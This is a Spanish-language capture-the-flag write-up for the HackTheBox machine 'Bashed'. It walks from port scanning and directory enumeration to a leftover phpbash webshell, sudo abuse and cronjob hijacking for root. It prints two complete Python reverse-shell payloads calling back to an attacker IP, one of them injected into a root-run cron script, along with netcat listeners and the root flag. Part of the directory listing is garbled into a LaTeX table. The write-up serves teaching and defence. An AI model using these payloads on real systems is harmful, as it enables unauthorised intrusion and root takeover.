---
title: "Bashed_Writeup"
machine: "Bashed"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
tags: ["Privesc", "Web"]
retired: true
summary: "Bashed es una máquina Linux de dificultad Easy en HackTheBox que gira en torno al descubrimiento de una webshell PHP (phpbash) dejada en el servidor por el prop"
draft: false
---
## BASHED

## HackTheBox - Linux / Easy

- PWNED

## Índice

## 1. Descripción General

Bashed es una máquina Linux de dificultad Easy en HackTheBox que gira en torno al descubrimiento de una webshell PHP (phpbash) dejada en el servidor por el propio desarrollador. La escalada de privilegios explota un cronjob que ejecuta scripts Python como root en un directorio escribible por un usuario intermedio.

| OS | Linux (Ubuntu 16.04) |
| --- | --- |
| Dificultad | Easy |
| Puntos | 20 |
| IP | 10.129.33.223 |
| Técnicas | Directory Enum, Webshell, Sudo Abuse, Cronjob Hijacking |

## 2. Reconocimiento

## Escaneo Nmap

nmap -sC -sV -oN bashed.nmap 10.129.33.223

```
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Solo dos puertos abiertos: SSH (22) y HTTP (80). La superficie de ataque principal es la aplicación web en el puerto 80.

## 3. Análisis de la Aplicación Web

El sitio web ‘Arrexel’s Development Site’ contiene un único post que menciona la herramienta phpbash:

```
"phpbash helps a lot with pentesting. I have tested it on multiple
different servers and it was very useful. I actually developed it
on this exact server!"
```

GitHub: https://github.com/Arrexel/phpbash

- CLAVE: El desarrollador afirma haber desarrollado phpbash en este mismo servidor. Esto implica que el archivo .php podría seguir presente en algún directorio.
phpbash es una webshell PHP interactiva que proporciona una terminal en el browser. El objetivo es encontrar en qué directorio fue dejada.

## 4. Enumeración de Directorios

```
gobuster dir -u http://10.129.33.223 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php -t 50
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301) <-- INTERESANTE
/js (Status: 301)
/config.php (Status: 200)
/fonts (Status: 301)
```

El directorio /dev/ resulta especialmente relevante dado que el desarrollador mencionó estar trabajando en phpbash. Al navegar a él, el directory listing está habilitado (misconfiguration adicional) y revela:
http://10.129.33.223/dev/
phpbash.min.php 2017-12-04 12:21 4.6K

phpbash.php 2017-11-30 23:56 8.1K

## 5. Acceso Inicial - phpbash Webshell

Navegando a http://10.129.33.223/dev/phpbash.php se obtiene una terminal interactiva en el browser ejecutando comandos como www-data.

```
# Verificación inicial
www-data@bashed:/var/www/html/dev# whoami
www-data
www-data@bashed:/var/www/html/dev# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
# Enumeración sudo
www-data@bashed:/var/www/html/dev# sudo -l
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
- www-data puede ejecutar CUALQUIER comando como scriptmanager sin contraseña.
```

## 6. Escalada a scriptmanager

La webshell phpbash no tiene TTY real, por lo que el cambio de usuario con sudo no funciona de forma interactiva. La solución es obtener una reverse shell real como scriptmanager.

## Listener en la máquina atacante

nc -lvnp 4444

## Payload en phpbash (como www-data)

```
sudo -u scriptmanager python -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.54",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash","-i"])'
# Conexión recibida
connect to [10.10.14.54] from (UNKNOWN) [10.129.33.223] 39456
scriptmanager@bashed:/var/www/html/dev$ whoami
scriptmanager
```

## 7. Escalada de Privilegios - Cronjob Hijacking

## Descubrimiento del vector

```
scriptmanager@bashed:/$ ls -la /scripts/

\begin{tabular}{lrllrrl}
drwxrwxr-- & 2 & scriptmanager & scriptmanager & 4096 & Jun & 2 \\
drwxr-xr-x & 23 & root & root & 4096 & Jun & 2 \\
-rw-r--r-- & 1 & scriptmanager & scriptmanager & 58 & Dec & 4 \\
-rw-r--r-- & 1 & root & root & 12 & May & 16 \\
-ro13:17 & test.py \\
-rw-test. & & & &
\end{tabular}
```

El análisis del directorio /scripts/ revela dos pistas críticas:

| Observación | Conclusión |
| --- | --- |
| test.py es owned por scriptmanager | Podemos modificarlo/sobreescribirlo |
| test.txt es owned por root | Root ejecutó test.py y creó ese archivo |
| Timestamp reciente en test.txt | Cronjob activo que corre cada ~1-2 minutos |

## Explotación

Sobreescribimos test.py con una reverse shell Python. Cuando el cronjob de root ejecute el script, obtendremos una shell como root.

## Nuevo listener

nc -lvnp 5555

## Inyección del payload

```
echo 'import socket,subprocess,os
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.54",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash","-i"])' > /scripts/test.py
```

Esperamos ~1-2 minutos a que el cronjob dispare…

```
# Shell recibida
connect to [10.10.14.54] from (UNKNOWN) [10.129.33.223] 58942
root@bashed:/scripts# whoami
root
```

## Root Flag

```
root@bashed:/scripts# cat /root/root.txt
8b929040efdcc400d732242491fe64c3
```

1. Resumen de la Cadena de Ataque

![image.png](/img/bashed/1.png)

## Lecciones Aprendidas

- Developer OPSEC:

Nunca dejar herramientas de desarrollo/testing en servidores de produccion.

- Directory Listing:

Deshabilitar el directory listing en Apache/Nginx evita la exposicion de archivos sensibles.

- Principio de minimo privilegio:
www-data no deberia poder ejecutar comandos como otros usuarios via sudo.
- Cronjobs y permisos:

Scripts ejecutados por root deben ser owned por root y no escribibles por otros usuarios.
docker webshell phpbash cronjob sudo-abuse directory-listing python-reverse-shell privilege-escalation

Writeup por **4Pr3nd1z** - Mayo 2026
